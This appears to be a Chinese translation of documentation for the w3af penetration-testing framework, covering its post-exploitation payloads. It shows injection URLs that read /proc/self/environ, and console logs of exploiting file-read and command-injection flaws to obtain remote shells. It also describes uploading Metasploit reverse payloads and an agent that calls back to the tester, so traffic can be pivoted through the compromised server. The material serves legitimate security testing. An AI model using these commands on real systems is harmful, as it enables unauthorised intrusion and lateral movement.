# Web 应用的攻击载荷 (Web Application Payloads)

## 简介 (Introduction)

在任何 Web 应用程序中都可以找到的数百种不同的 Web 应用程序漏洞中，**只有一小部分可以使入侵者直接执行操作系统命令**。而且，如果我们继续深入研究这组为攻击者提供执行系统命令权限的漏洞，其中只有一到两种能在正常场景下给予攻击者提升权限的机会。

请始终记住，渗透测试器的目标是在远程服务器中获得 `root shell` ，Web 应用程序似乎比传统的内存破坏漏洞提供了更多的抵抗力。如果您有一个 `Metasploit` 框架与远程服务器安装相匹配的 `0day` 漏洞，那么这是正确的，但是如果没有，**Web 可能是唯一的攻击途径**。

到目前为止，漏洞利用与权限提升的过程必须被手动执行，这在许多情况下可能需要几个小时（取决于 Web 应用程序渗透测试人员的技能），并且存在无法达成目标的可能性。

当前 Web 应用程序的攻击载荷是从 80 年代开始在老旧的学校系统上进行内存破坏的攻击载荷演变而来。
每个攻击载荷解决的基础问题很简单，“现在我有访问权限了，下一步该怎么做?”。在内存破坏的攻击载荷中，很容易就可以达到任意任务的执行，因为成功的漏洞利用时，攻击者可以控制远程 CPU 和 内存，这使得攻击者可以实行任意系统调用 (operating system calls) 。 在拥有执行任意系统调用的能力下，新建一个用户，执行任意命令、上传文件等操作都是可能实现的。

在 Web 应用安全的场景则是完全不同的，攻击者受限于 web 应用脚本暴露的有限的 "系统调用"。举个例子，

* 任意文件读取漏洞 暴露了 `read()` 系统调用
* 系统命令执行漏洞 暴露了 `exec()` 系统调用
* SQL 注入漏洞 暴露了 `read(), write()` 以及 潜在的 `exec()` 系统调用


Web 应用程序攻击载荷是一小段代码，这些代码在入侵者的机器中运行，然后由 Web 应用程序漏洞利用程序转换为 GET 和 POST 请求的组合，以发送到远程 Web 服务器。 例如， 一个模拟 系统调用 `read ()` 的调用可以是 `/proc/self/environ` 作为参数，的任意文件读取漏洞： `http://host.tld/read.php?file=/proc/self/environ` 。

另一个请求则利用了系统命令执行漏洞（来达到相似的结果）:
`http://host.tld/os.php?cmd=;cat /proc/self/environ`

## 运行攻击载荷 (Running Web Application Payloads)


以下是一个 w3af 扫描某个脆弱应用的控制台日志 dump，在这个场景中 w3af 利用了某个漏洞，并且执行了 `list_processes` 攻击载荷。

```bash
w3af>>> plugins
w3af/plugins>>> audit lfi
w3af/plugins>>> back
w3af>>> target
w3af/config:target>>> set target http://localhost/local_file_read.php?file=section.txt
w3af/config:target>>> back
w3af>>> start
Found 1 URLs and 1 different points of injection.
The list of URLs is:
- http://localhost/local_file_read.php
The list of fuzzable requests is:
- http://localhost/local_file_read.php | Method: GET | Parameters: (file="section.txt")
Starting lfi plugin execution.
Local File Inclusion was found at: "http://localhost/local_file_read.php", using HTTP method GET.
The sent data was: "file=../../../../../../../../etc/passwd".
This vulnerability was found in the request with id 3.
Finished scanning process.
w3af>>> exploit
w3af/exploit>>> exploit local_file_reader
local_file_reader exploit plugin is starting.
- [0] <shell object (rsystem: "*nix")>
Please use the interact command to interact with the shell objects.
w3af/exploit>>> interact 0
Execute "end_interaction" to get out of the remote shell. Commands typed in this menu will
run through the local_file_reader shell
w3af/exploit/local_file_reader-0>>> payload list_processes
...
PID   NAME   STATUS          CMD
1     init   S (sleeping)    /sbin/init
5183  mysqld S (sleeping)    /usr/sbin/mysqld
w3af/exploit/local_file_reader-0>>>
```

这显示了如何**利用一个简单的任意文件读取漏洞**来检索**正在运行的进程的完整列表**。为简洁起见，未显示能够读取打开的 TCP/IP 连接，操作系统 IP 路由表以及更多信息的类似示例。

使用 `lsp` 命令可以列出所有可用的攻击载荷。请务必注意，可以运行的有效负载列表会根据所使用的漏洞进行更改。例如，在远程文件包含漏洞的 shell 中运行可能会返回所有 攻击载荷 的列表， 而且 本地文件读取 shell 中运行， 塔将返回 漏洞仅开放 `read()` 系统调用时可以运行的攻击载荷 (而不是完整的攻击载荷列表)。

## 与 Metasploit 集成 (Metasploit integratio)
这里还有一组 web 应用攻击载荷 可以用来与 Metasploit 框架交互。当漏洞利用提供 `exec()` 系统调用时，这允许 `w3af` 用户上传 Metasploit 攻击载荷到目标系统，并执行他们以进行 后渗透 的步骤。

* msf_linux_x86_meterpreter_reverse
* msf_windows_meterpreter_reverse_tcp
* msf_windows_vncinject_reverse

基本过程如下 

* 在扫描过程中识别漏洞
* 利用漏洞
* 使用 Run “payload <payload_name>”

## 通过受害主机代理流量 (Metasploit integration)

我们也实现了一个 web 应用载荷，其功能是建立一个  反向通道 (reverse tunnel) 会以受害主机为代理 路由 TCP 连接。 在进行示例展示签，我们先解释一下这个功能的应用场景，对整个攻击过程与步骤进行一个总结：

1. `w3af` 发现一个可以进行远程命令执行的漏洞
2. 用户利用了该漏洞，并且启动了一个 `w3af_agent`
3. `w3af` 发送一个小体积的可执行文件到远程服务器执行 extrusion scan。 这个可执行文件会主动对 `w3af` 建立一个连接，帮助 `w3af` 框架识别远程服务器上可以外连的防火墙规则。 
4. `w3af_agent` 管理器会将 `w3afAgentClient` 发送到远程服务器。这个上传文件到远程服务器的过程受到 远程服务器操作系统，运行 `w3af` 用户的权限 以及 本地操作统 影响。不过大部分情况下发生了如下的案例：
    * `w3af` 复用在步骤3 extrusion scan 时得到的信息，这么做的目的时了解那个端口可以被用于在受害服务器上监听外来的 TCP 连接。
    * 如果在远程防火墙规则上找到一个可用的 TCP 端口， `w3af` 会在这个端口上运行一个TCP服务端应用。此时远程受害主机会连接到 `w3af` 的服务器，下载 PE/ELF 生成文件。 如果没有可用的 TCP 端口， w3af 会通过若干个 `echo` 命令将 PE/ELF 文件发送到远程服务器，这个过程会慢很多，但踪能成功，这是一种带内传输方法
5. `w3af_agent` 管理器会启动一个 `w3afAgentServer` ，这个 Server 监听 `localhost:1080` （大部分 w3af 用户都使用这个），之后在交互界面 (misc-settings->interface) 配置，会使用 步骤3 发现可用的端口
6. `w3afAgentClient` 连接到 `w3afAgentServer`，成功构造了通道(tunnel)
7. 用户为他需要代理的应用配置 代理地址 "localhost:1080"
8. 当这个应用通过 socks 代理连接，所有上行连接都会被路由到远程受害服务器。

现在我们已经理解理论了，让我们看一下这个功能的示例吧

```bash
w3af>>> plugins
w3af/plugins>>> audit os_commanding
w3af/plugins>>> back
w3af>>> target
w3af/target>>> set target http://172.10.10.1/w3af/v.php?c=list
w3af/target>>> back
w3af>>> start
The list of found URLs is:
- http://172.10.10.1/w3af/v.php
Found 1 URLs and 1 different points of injection.
The list of Fuzzable requests is:
- http://172.10.10.1/w3af/v.php | Method: GET | Parameters: (c)
Starting os_commanding plugin execution.
OS Commanding was found at: http://172.10.10.1/w3af/v.php . Using method: GET.
The data sent was: c=%2Fbin%2Fcat+%2Fetc%2Fpasswd The vulnerability was found in the request with id 2.
w3af>>> exploit
os_commanding exploit plugin is starting.
Vulnerability successfully exploited. This is a list of available shells:
- [0] <os_commanding object (ruser: "www-data" | rsystem: "Linux brick 2.6.24-19-generic i686 GNU/Linux")>
Please use the interact command to interact with the shell objects.
w3af/exploit>>> interact 0
Execute "end_interaction" to get out of the remote shell.
Commands typed in this menu will run on the remote web server.
w3af/exploit/os_commanding-0>>>
```

目前来看并没有新的内容，我们配置了 `w3af` ，用它扫描和利用了漏洞。

```bash
w3af/exploit/os_commanding-0>>> payload w3af_agent
Usage: w3af_agent <your ip address>
w3af/exploit/os_commanding-0>>> payload w3af_agent 172.1.1.1
Please wait some seconds while w3af performs an extrusion scan.
The extrusion scan failed.
Error: The user running w3af can't sniff on the specified interface. Hints: Are you root?
Does this interface exist?
Using inbound port "8080" without knowing if the remote host will be able to connect back.
```

当你使用普通用户运行 `w3af` 时，上面的错误信息就会出现。原因很简单，当你以普通用户权限运行 `w3af` 时，你不能嗅探(sniff)流量，因此也无法进行一次成功的 extrusion scan 。一个成功的 extrusion scan 看看起来像下面这样：

```bash
Please wait some seconds while w3af performs an extrusion scan.
ExtrusionServer listening on interface: eth1
Finished extrusion scan.
The remote host: "172.10.10.1" can connect to w3af with these ports:
- 25/TCP
- 80/TCP
- 53/TCP
- 1433/TCP
- 8080/TCP
- 53/UDP
- 69/UDP
- 139/UDP
- 1025/UDP
The following ports are not bound to a local process and can be used by w3af:
- 25/TCP
- 53/TCP
- 1433/TCP
- 8080/TCP
Selecting port "8080/TCP" for inbound connections from the compromised server to w3af.
```

在两种场景下(普通用户和超级用户)，接下来的步骤都是这样：

```bash
Starting w3afAgentClient upload.
Finished w3afAgentClient upload.
Please wait 30 seconds for w3afAgentClient execution.
w3afAgent service is up and running.
You may start using the w3afAgent that is listening on port 1080. All connections made
through this SOCKS daemon will be relayed using the compromised server.
```

现在，从另一个控制台，我们可以使用 `socksClient` 通过受感染的服务器路由连接：

```bash
$ nc 172.10.10.1 22
(UNKNOWN) [172.10.10.1] 22 (ssh) : Connection refused
$ python socks_client.py 127.0.0.1 22
SSH-2.0-OpenSSH_4.3p2 Debian-8ubuntu1
Protocol mismatch.
```

`socks_client.py` 代码如下所示：

```bash
import extlib.socksipy.socks as socks
import sys

s = socks.socksocket()
s.setproxy(socks.PROXY_TYPE_SOCKS4,"localhost")
s.connect((sys.argv[1],int(sys.argv[2])))

s.send('\n')
print s.recv(1024)

```





